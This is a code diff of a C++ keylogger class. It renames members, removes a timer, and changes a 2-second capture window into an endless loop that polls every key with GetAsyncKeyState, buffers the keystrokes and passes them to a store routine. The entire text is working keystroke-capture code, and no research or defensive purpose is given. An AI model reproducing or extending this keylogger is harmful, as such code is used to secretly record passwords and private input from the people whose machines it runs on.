@@ -1,38 +1,38 @@
 #include "./keylogger.hpp"
 
-keylogger::keylogger()
+using namespace chrono;
+
+keylogger::keylogger() : m_buffer(), m_buffer_size(0), m_no_click(false), m_alphabet_only(false), m_store_character(false)
 {
-	a_buffer = new string();
 }
 
 keylogger::~keylogger()
 {
-	delete a_buffer;
 }
+
 
 void keylogger::start()
 {
-	for(chrono::time_point<chrono::system_clock> runUntil = chrono::system_clock::now() + chrono::seconds(2);
-			std::chrono::system_clock::now() < runUntil;)
-		for (int t_key = 1; t_key < 255; t_key++)
-			if (GetAsyncKeyState(t_key) == -32767)
+	while(true)
+		for (int key = 1; key < 255; key++)
+			if (GetAsyncKeyState(key) == -32767)
 			{
-				if(a_no_click == true && (t_key == 1 || t_key == 2))
+				if(m_no_click == true && (key == 1 || key == 2))
 				{
 
 				}
 				else
 				{
-					if(a_alphabet_only == true && (t_key < 65 || t_key > 122))
+					if(m_alphabet_only == true && (key < 65 || key > 122))
 						break;
 
-					a_buffer->push_back(t_key);
+					m_buffer.push_back(key);
 
-					if(a_buffer->length() == a_buffer_size)
+					if(m_buffer.length() == m_buffer_size)
 					{
 						store();
 
-						a_buffer->clear();
+						m_buffer.clear();
 					}
 				}
 			}
@@ -40,25 +40,20 @@ void keylogger::start()
 
 void keylogger::set_buffer_size(size_t p_new_buffer_size)
 {
-	a_buffer_size = p_new_buffer_size;
+	m_buffer_size = p_new_buffer_size;
 }
 
 void keylogger::set_no_click(bool p_no_click)
 {
-	a_no_click = p_no_click;
+	m_no_click = p_no_click;
 }
 
 void keylogger::set_alphabet_only(bool p_alphabet_only)
 {
-	a_alphabet_only = p_alphabet_only;
+	m_alphabet_only = p_alphabet_only;
 }
 
 void keylogger::set_store_character(bool p_store_character)
 {
-	a_store_character = p_store_character;
-}
-
-void keylogger::set_timer(int p_timer)
-{
-	a_timer = p_timer;
+	m_store_character = p_store_character;
 }
